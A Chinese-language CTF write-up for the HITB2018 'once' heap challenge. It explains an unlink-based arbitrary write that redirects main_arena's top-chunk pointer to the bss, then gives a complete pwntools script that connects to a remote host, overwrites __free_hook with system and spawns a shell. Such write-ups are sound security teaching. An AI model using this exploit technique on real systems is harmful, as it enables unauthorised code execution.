这题出得不错，虽然有点极限利用的感觉

首先说下程序的功能吧

![](https://github.com/charlieleex/CTF_Writeup/blob/master/HITB2018/once/t1.jpg)

第一个是alloc
里面是一个双向链表的结构

第二个是change_list
是修改当前链表中的第一个

第三个是list_next，是将list指向下一个

第四个trigger，这是我自己瞎起的名字，不过这里也比较重要
里面能malloc, read ,free 一个堆一次，大小也有限制

然后不是这几个选项的话，就会输出puts的地址，这里我称之为gitf吧

我说下我做题的思路是怎样的吧

首先在change list中，可以修改当前链表中第一个的内容，这样配合alloc和list_next中的unlink操作，就可以实现任意地址赋值为堆中的地址或者bss段中的地址

关键有了这个漏洞之后，写哪里，写什么是一个问题

这个时候，在脑子中迅速列出了两个选项：

1. main_arena 中的fast bin list
2. main_arena 中指向top chunk的地址

后面选择了第二个，第一个貌似也是可以的

但是有一个问题，就是无论哪一个，都需要配合上自己构造的数据

然后试着调了一下程序，发现list的初始值居然指向自身地址-0x10

然后利用change_list，就可以构造出所需要的数据，然后很明显，再用list_next就可以在fast bin list 或者main arena中top chunk的地址上写上list-0x10

这个时候用trigger 中的malloc，就可以返回list-0x10的地址，之后就可以实现控制bss段中的数据，后面就可以各种骚操作了

下面是payload

```
from pwn import *

debug=0
e=ELF('./libc.so')
if debug:
    p=process('once',env={'LD_PRELOAD':'./libc.so'})
    context.log_level='debug'
    gdb.attach(p)
else:
    p=remote('47.75.189.102', 9999)

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)


def gift():
    se('0\n')
    ru('Invalid choice\n')
    base=int(p.recv(14),16)-e.symbols['puts']
    return base

def alloc():
    se('1\n')
    ru('suceess')

def change(content):
    se('2\n')
    sleep(0.5)
    se(content)
    ru('success')

def next():
    se('3\n')
    ru('success')


def trigger():
    se('4\n')
    sleep(0.5)

def trigger_read(content):
    se('2\n')
    sleep(0.5)
    se(content)
    ru('>')

def trigger_malloc(sz):
    se('1\n')
    ru('input size:')
    se(str(sz)+'\n')
    ru('>')

def trigger_end():
    se('4\n')
    ru('>')



base=gift()

main_arena=0x3C4B78+base

bss_start=base+0x3C5620
stdin=base+0x3C48E0

free_hook=base+e.symbols['__free_hook']

binsh=base+e.search('/bin/sh').next()

change(p64(1)+p64(0x20fe1)+p64(main_arena-0x10)*2)

alloc()

next()

trigger()

trigger_malloc(400)

payload=p64(free_hook)*2+p64(bss_start)+p64(0)+p64(stdin)+p64(0)*2
payload+=p64(binsh)+p32(0)+p32(0x100)+p64(0)

trigger_read(payload)

trigger_end()

change(p64(base+e.symbols['system']))

se('4\n')
sleep(0.5)
se('3\n')

p.interactive()

```